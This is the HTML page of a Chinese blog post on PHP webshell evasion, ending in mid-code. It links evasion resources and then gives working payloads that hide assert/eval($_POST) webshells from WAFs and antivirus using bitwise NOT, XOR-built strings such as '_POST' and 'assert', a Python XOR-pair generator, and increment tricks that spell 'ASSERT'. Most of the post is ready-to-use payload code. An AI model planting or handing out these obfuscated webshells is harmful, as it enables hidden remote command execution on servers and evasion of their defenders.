@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Php Webshell免杀 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='攻防, 免杀' />
+  <meta itemprop="name" content="php webshell免杀">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="1401">
+  <meta itemprop="keywords" content="攻防,免杀"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E5%85%8D%E6%9D%80/67/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="php webshell免杀">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="攻防">
+    <meta property="article:tag" content="免杀">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="php webshell免杀">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E5%85%8D%E6%9D%80/67/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/25/" /><link rel="next" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/%E6%9C%A8%E9%A9%AC%E5%BC%80%E5%8F%91/4/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "php webshell免杀",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91\/%E5%85%8D%E6%9D%80\/67\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 免杀","wordcount":  1401 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91\/%E5%85%8D%E6%9D%80\/67\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Php Webshell免杀</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Php Webshell免杀</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1401 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>远控免杀系列  <a href="https://github.com/TideSec/BypassAntiVirus"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/TideSec/BypassAntiVirus</a>  <a href="https://www.freebuf.com/articles/system/227461.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/articles/system/227461.html</a></p>
+<p>php webshell免杀  <a href="https://paper.seebug.org/3044/"target="_blank" rel="external nofollow noopener noreferrer">https://paper.seebug.org/3044/</a>   <a href="https://www.freebuf.com/articles/web/343192.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/articles/web/343192.html</a>  <a href="https://tttang.com/archive/1740/#toc_22"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/archive/1740/#toc_22</a>    免杀工具https://www.secpulse.com/archives/184357.html</p>
+<p>java免杀  <a href="https://tttang.com/archive/1739/"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/archive/1739/</a>  <a href="https://tttang.com/archive/1315/"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/archive/1315/</a></p>
+<p>webshell的免杀远比木马免杀容易得多，其实我们的目光不能再放在什么某狗，某盾，某塔，这些waf上，应该将目标定为于新型的云waf上。</p>
+<h5 id="php免杀" class="heading-element"><span>0.0.0.1  PHP免杀</span>
+  <a href="#php%e5%85%8d%e6%9d%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="位运算" class="heading-element"><span>0.0.0.1.1  位运算</span>
+  <a href="#%e4%bd%8d%e8%bf%90%e7%ae%97" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 取反</p>
+<p>如图示，对phpinfo取反，再取反，仍然得到phpinfo，但是可以利用它进行一些对数字字母过滤的绕过</p>
+<p>paylaod: (~%8F%97%8F%96%91%99%90)();</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">urlencode</span>(<span style="color:#ff636f">~</span><span style="color:#a6be9d">&#39;assert&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$a</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#39;666&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$b</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">urlencode</span>(<span style="color:#ff636f">~</span><span style="color:#a6be9d">&#39;eval($_POST[1]);&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$b</span>;</span></span></code></pre></div><p>shell</p>
+<pre tabindex="0"><code>?cmd=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);</code></pre><pre tabindex="0"><code>?cmd=$_=~%9E%8C%8C%9A%8D%8B;$__=~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4;$_($__);</code></pre><p>PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(&lsquo;phpinfo&rsquo;)();来执行函数，第一个括号中可以是任意PHP表达式。</p>
+<p>####### 异或</p>
+<p>在PHP中两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCI值，再转换成字符串。</p>
+<p>这里有一个异或构造的脚本, 相信聪明的你一看就知道怎么回事了</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">valid</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;1234567890!@$%^*()</span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">[];</span><span style="color:#a6be9d">\&#39;\&#34;</span><span style="color:#a6be9d">,.&lt;&gt;/?-=_`~ &#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">answer</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">str</span>(<span style="color:#58a1dd">input</span>(<span style="color:#a6be9d">&#34;请输入进行异或构造的字符串：&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">tmp1</span>, <span style="color:#58a1dd">tmp2</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;&#39;</span>, <span style="color:#a6be9d">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">for</span> <span style="color:#58a1dd">c</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">answer</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">for</span> <span style="color:#58a1dd">i</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">valid</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> <span style="color:#58a1dd">j</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">valid</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">ord</span>(<span style="color:#58a1dd">i</span>) <span style="color:#ff636f">^</span> <span style="color:#58a1dd">ord</span>(<span style="color:#58a1dd">j</span>) <span style="color:#ff636f">==</span> <span style="color:#58a1dd">ord</span>(<span style="color:#58a1dd">c</span>)):
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">tmp1</span> <span style="color:#ff636f">+=</span> <span style="color:#58a1dd">i</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">tmp2</span> <span style="color:#ff636f">+=</span> <span style="color:#58a1dd">j</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">else</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#ff636f">continue</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">break</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#34;tmp1为:&#34;</span>,<span style="color:#58a1dd">tmp1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#34;tmp2为:&#34;</span>,<span style="color:#58a1dd">tmp2</span>)</span></span></code></pre></div><p>那么怎么利用呢？</p>
+<p>下面是几个例子</p>
+<p>需要注意的是，由于我们的Payload中含有一些特殊字符，我们传参的时候需要对Payload进行一次URL编码。</p>
+<pre tabindex="0"><code>$__=(&#34;#&#34;^&#34;|&#34;).(&#34;.&#34;^&#34;~&#34;).(&#34;/&#34;^&#34;`&#34;).(&#34;|&#34;^&#34;/&#34;).(&#34;{&#34;^&#34;/&#34;);  //变量$__值为字符串&#39;_POST&#39;</code></pre><pre tabindex="0"><code>mess=$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___=$$__;$_($___[_]);&amp;_=print_r(show_source(&#39;p.php&#39;));</code></pre><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;!((%)(&#34;</span><span style="color:#ff636f">^</span><span style="color:#a6be9d">&#34;@[[@[</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">&#34;</span>;   <span style="color:#828b96;font-style:italic">//构造出assert
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;!+/((&#34;</span><span style="color:#ff636f">^</span><span style="color:#a6be9d">&#34;~{`{|&#34;</span>;   <span style="color:#828b96;font-style:italic">//构造出_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$$__</span>;   <span style="color:#828b96;font-style:italic">//$___ = $_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_</span>(<span style="color:#58a1dd">$___</span>[<span style="color:#58a1dd">_</span>]);   <span style="color:#828b96;font-style:italic">//assert($_POST[_]);
+</span></span></span></code></pre></div><pre tabindex="0"><code>${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();&amp;%A0=命令或函数  </code></pre><pre tabindex="0"><code>${&#34;`{{{&#34;^&#34;?&lt;&gt;/&#34;}[&#39;+&#39;]();&amp;+=命令   //$_GET[+]</code></pre><p>####### 自增</p>
+<p>个人认为拿到自增的初始值是自增rce最精髓的部分之一</p>
+<ul>
+<li>
+<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为&quot;Array&quot;。再取这个字符串的第一个字母，就可以获得&quot;==A==&quot;。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;&#39;</span><span style="color:#ff636f">.</span>[];
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">$a</span>); <span style="color:#828b96;font-style:italic">//Array
+</span></span></span></code></pre></div></li>
+<li>
+<p>$++对变量进行了自增操作,由于我们没有定义的值,PHP会给赋一个默认值NULL==0,由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">++</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">$_</span>);  <span style="color:#828b96;font-style:italic">//1
+</span></span></span></code></pre></div></li>
+<li>
+<p>$__没有定义，默认为Null也即==0==</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">$__</span>);</span></span></code></pre></div><p>那++$__就是==1==</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#ff636f">++</span><span style="color:#58a1dd">$__</span>);</span></span></code></pre></div></li>
+<li>
+<p>==NAN==</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span> <span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff636f">echo</span> ((<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span>)<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;&#39;</span>);</span></span></code></pre></div><p>==N==</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> ((<span style="color:#58a1dd">_</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">_</span>)<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;&#39;</span>){<span style="color:#58a1dd">$_</span>};</span></span></code></pre></div></li>
+</ul>
+<p>payload</p>
+<p>初始</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_</span><span style="color:#ff636f">=</span>[]<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;&#39;</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;Array&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_</span>[<span style="color:#58a1dd">$__</span>];   <span style="color:#828b96;font-style:italic">//得到&#34;A&#34;，$__没有定义，默认为False也即0，此时$___=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$___</span>;   <span style="color:#828b96;font-style:italic">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$_</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$___</span>;   <span style="color:#828b96;font-style:italic">//$_=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;S&#34;，此时$__=&#34;S&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$___=&#34;AS&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$___=&#34;ASS&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_</span>;   <span style="color:#828b96;font-style:italic">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;<span style="color:#58a1dd">$__</span><span style="color:#ff636f">++</span>;   <span style="color:#828b96;font-style:italic">//得到&#34;E&#34;，此时$__=&#34;E&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$___</span> <span style="color:#ff636f">.=</span> <span style="color:#58a1dd">$__</span>;   <span style="color:#828b96;font-style:italic">//$___=&#34;ASSE&#34;
